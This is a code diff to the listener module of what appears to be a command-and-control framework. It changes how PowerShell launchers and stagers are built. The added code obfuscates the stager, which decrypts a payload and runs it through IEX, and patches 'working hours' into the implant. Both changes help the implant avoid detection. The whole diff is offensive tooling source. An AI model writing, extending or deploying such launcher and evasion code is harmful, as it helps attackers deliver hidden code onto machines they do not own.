@@ -146,7 +146,7 @@ class Listener:
         return True
 
 
-    def generate_launcher(self, encode=True, userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -243,8 +243,10 @@ class Listener:
                 # decode everything and kick it over to IEX to kick off execution
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
 
+                if obfuscate:
+                    stager = helpers.obfuscate(stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
-                if encode:
+                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                     return helpers.powershell_launcher(stager, launcher)
                 else:
                     # otherwise return the case-randomized stager
@@ -331,6 +333,7 @@ class Listener:
         baseFolder = listenerOptions['BaseFolder']['Value'].strip('/')
         apiToken = listenerOptions['APIToken']['Value']
         profile = listenerOptions['DefaultProfile']['Value']
+        workingHours = listenerOptions['WorkingHours']['Value']
         stagingFolder = "/%s/%s" % (baseFolder, listenerOptions['StagingFolder']['Value'].strip('/'))
 
         if language.lower() == 'powershell':
@@ -344,6 +347,10 @@ class Listener:
             stager = stager.replace('REPLACE_STAGING_FOLDER', stagingFolder)
             stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
             stager = stager.replace('REPLACE_POLLING_INTERVAL', pollInterval)
+
+            #patch in working hours, if any
+            if workingHours != "":
+                stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)
 
             randomizedStager = ''
 
@@ -436,8 +443,6 @@ class Listener:
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
                 code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
-            if workingHours != "":
-                code = code.replace('$WorkingHours,', "$WorkingHours = '" + str(workingHours) + "',")
 
             return code
         elif language == 'python':
